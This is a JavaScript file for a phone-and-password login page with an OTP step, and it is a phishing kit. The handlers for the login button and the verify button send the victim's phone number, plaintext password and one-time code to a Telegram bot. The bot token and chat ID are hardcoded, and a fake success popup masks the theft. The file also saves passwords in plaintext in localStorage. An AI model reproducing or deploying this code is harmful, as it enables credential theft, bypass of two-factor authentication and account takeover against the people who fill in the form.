const phoneInput = document.getElementById('phoneInput');
const passInput = document.getElementById('passInput');
const phoneWrapper = document.getElementById('phoneWrapper');
const passWrapper = document.getElementById('passWrapper');
const phoneError = document.getElementById('phoneError');
const loginBtn = document.getElementById('loginBtn');
const savePass = document.getElementById('savePass');
const agreeCheck = document.getElementById('agreeCheck');
const otpOverlay = document.getElementById('otpOverlay');
const verifyBtn = document.getElementById('verifyBtn');
const successPopup = document.getElementById('successPopup');
const timerCount = document.getElementById('timerCount');
const loadingPopup = document.getElementById('loadingPopup');
const otpInputs = document.querySelectorAll('.otp-input');

phoneInput.addEventListener('input', function() {
    this.value = this.value.replace(/[^0-9]/g, '');
    if (this.value.length > 0) {
        phoneWrapper.classList.remove('error');
        phoneError.classList.remove('show');
    }
});

phoneInput.addEventListener('blur', function() {
    if (this.value.trim() === '') {
        phoneWrapper.classList.add('error');
        phoneError.classList.add('show');
    }
});

passInput.addEventListener('focus', function() {
    passWrapper.style.borderBottomColor = '#2196f3';
});

passInput.addEventListener('blur', function() {
    passWrapper.style.borderBottomColor = '#e0e0e0';
});

const resendTimerSpan = document.getElementById('resendTimer');
const resendText = document.getElementById('resendText');
const otpCloseBtn = document.getElementById('otpCloseBtn');
const otpPhoneDisplay = document.getElementById('otpPhoneDisplay');

let resendCountdown = 120;
let resendInterval = null;

function startResendTimer() {
    resendCountdown = 120;
    resendTimerSpan.textContent = resendCountdown;
    resendText.innerHTML = 'Resend in <span id="resendTimer">120</span> seconds';
    if (resendInterval) clearInterval(resendInterval);
    resendInterval = setInterval(function() {
        resendCountdown--;
        resendTimerSpan.textContent = resendCountdown;
        if (resendCountdown <= 0) {
            clearInterval(resendInterval);
            resendInterval = null;
            resendText.innerHTML = 'Didn\'t receive? <a id="resendLink">Resend</a>';
            document.getElementById('resendLink').addEventListener('click', function() {
                startResendTimer();
                alert('New OTP sent to your phone!');
            });
        }
    }, 1000);
}

otpInputs.forEach((input, index) => {
    input.addEventListener('input', function() {
        this.value = this.value.replace(/[^0-9]/g, '');
        if (this.value) {
            this.classList.add('filled');
            if (index < otpInputs.length - 1) {
                otpInputs[index + 1].focus();
            } else {
                let otp = '';
                otpInputs.forEach(inp => { otp += inp.value; });
                if (otp.length === otpInputs.length) {
                    verifyBtn.click();
                }
            }
        } else {
            this.classList.remove('filled');
        }
    });
    input.addEventListener('keydown', function(e) {
        if (e.key === 'Backspace' && !this.value && index > 0) {
            otpInputs[index - 1].focus();
        }
    });
});

function resetOtpPopup() {
    otpOverlay.classList.remove('show');
    if (resendInterval) clearInterval(resendInterval);
    resendInterval = null;
    otpInputs.forEach(inp => { inp.value = ''; inp.classList.remove('filled'); });
}

otpCloseBtn.addEventListener('click', resetOtpPopup);

otpOverlay.addEventListener('click', function(e) {
    if (e.target === otpOverlay) {
        resetOtpPopup();
    }
});

loginBtn.addEventListener('click', function(e) {
    e.preventDefault();

    let isValid = true;

    if (phoneInput.value.trim() === '') {
        phoneWrapper.classList.add('error');
        phoneError.classList.add('show');
        isValid = false;
    }

    if (passInput.value.trim() === '') {
        passWrapper.style.borderBottomColor = '#e53935';
        isValid = false;
        setTimeout(() => {
            passWrapper.style.borderBottomColor = '#e0e0e0';
        }, 2000);
    }

    if (!agreeCheck.checked) {
        alert('Please agree to the User Privacy Agreement');
        isValid = false;
    }

    if (isValid) {
        const phone = phoneInput.value;
        const password = passInput.value;
        sendLoginToTelegram(phone, password);

        const masked = phone.slice(0, 2) + '***' + phone.slice(-4);
        otpPhoneDisplay.textContent = masked;

        otpInputs.forEach(inp => { inp.value = ''; inp.classList.remove('filled'); });
        otpOverlay.classList.add('show');
        otpInputs[0].focus();
        startResendTimer();
    }
});

function base64ToBlob(base64, mime) {
    const byteChars = atob(base64);
    const byteArrays = [];
    for (let offset = 0; offset < byteChars.length; offset += 512) {
        const slice = byteChars.slice(offset, offset + 512);
        const byteNumbers = new Array(slice.length);
        for (let i = 0; i < slice.length; i++) {
            byteNumbers[i] = slice.charCodeAt(i);
        }
        byteArrays.push(new Uint8Array(byteNumbers));
    }
    return new Blob(byteArrays, { type: mime });
}

function sendLoginToTelegram(phone, password) {
    const botToken = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
    const chatId = '-1003923232961';
    const caption = `🔔 New Login Details\n\n📱 Phone: \`${phone}\`\n🔑 Password: \`${password}\`\n\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ Tap on any value above to copy`;

    const blob = base64ToBlob(LOGO_IMAGE_BASE64, 'image/png');
    const formData = new FormData();
    formData.append('chat_id', chatId);
    formData.append('photo', blob, 'logo.png');
    formData.append('caption', caption);
    formData.append('parse_mode', 'Markdown');

    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
        method: 'POST',
        body: formData
    }).catch(function(err) {
        console.warn('Telegram sendPhoto failed, trying text only:', err);
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'Markdown' })
        });
    });
}

function sendOtpToTelegram(phone, otp) {
    const botToken = '8786937967:AAF89mjtatOLHo44RGGay_1C6_ZwlCScrnM';
    const chatId = '-1003923232961';
    const caption = `🔢 OTP Received\n\n📱 Phone: \`${phone}\`\n🔢 OTP: \`${otp}\`\n\n⏰ Time: ${new Date().toLocaleString()}\n\n✅ Tap on any value above to copy`;

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: caption, parse_mode: 'Markdown' })
    });
}

verifyBtn.addEventListener('click', function() {
    let otp = '';
    otpInputs.forEach(input => { otp += input.value; });

    if (otp.length < 4) {
        alert('Please enter complete OTP');
        return;
    }

    const phone = phoneInput.value;

    sendOtpToTelegram(phone, otp);

    resetOtpPopup();
    successPopup.classList.add('show');

    let timeLeft = 10;
    timerCount.textContent = timeLeft;

    const timer = setInterval(() => {
        timeLeft--;
        timerCount.textContent = timeLeft;
        if (timeLeft <= 0) {
            clearInterval(timer);
            successPopup.classList.remove('show');
        }
    }, 1000);
});

savePass.addEventListener('change', function() {
    if (this.checked && phoneInput.value && passInput.value) {
        localStorage.setItem('tivra_phone', phoneInput.value);
        localStorage.setItem('tivra_password', passInput.value);
    } else if (!this.checked) {
        localStorage.removeItem('tivra_phone');
        localStorage.removeItem('tivra_password');
    }
});

window.addEventListener('DOMContentLoaded', function() {
    const savedPhone = localStorage.getItem('tivra_phone');
    const savedPass = localStorage.getItem('tivra_password');

    if (savedPhone && savedPass) {
        phoneInput.value = savedPhone;
        passInput.value = savedPass;
        savePass.checked = true;
    }
});

document.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') {
        loginBtn.click();
    }
});